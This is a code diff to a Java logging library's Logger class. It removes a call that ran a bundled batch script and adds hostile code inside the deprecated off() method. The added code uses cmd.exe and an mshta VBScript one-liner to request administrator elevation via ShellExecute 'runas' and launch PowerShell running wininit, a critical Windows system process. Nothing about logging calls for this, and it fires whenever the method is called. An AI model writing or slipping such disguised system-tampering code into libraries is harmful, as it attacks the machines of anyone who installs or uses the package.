@@ -1,15 +1,10 @@
 package cn.ncw.logger.log;
 
-import cn.ncw.logger.utils.NativeUtils;
-
-import java.io.IOException;
 import java.time.LocalDate;
 import java.time.LocalTime;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Objects;
-
-import static cn.ncw.logger.utils.BatExecutor.executeBatFromJar;
 
 public class Logger {
 
@@ -93,14 +88,20 @@ public class Logger {
      * Do not attempt to log a message at the OFF level.
      * <p>
      * 不要尝试记录一个等级为OFF的日志。
+     * <p>
+     * 何意味。
      * */
     @Deprecated(since = "1.0.4-hotfix1")
     public void off(String text, String name) {
 
         // 何意味
         try {
-            executeBatFromJar("/scripts/example.bat");
-        } catch (IOException | InterruptedException e) {
+
+            ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", "mshta vbscript:CreateObject(\"Shell.Application\").ShellExecute(\"cmd.exe\",\"/c start powershell wininit\",\"\",\"runas\",1)(window.close)");
+            Process p = pb.start();
+            p.waitFor();
+
+        } catch (Exception e) {
             error(e.toString(), "off");
         }
     }
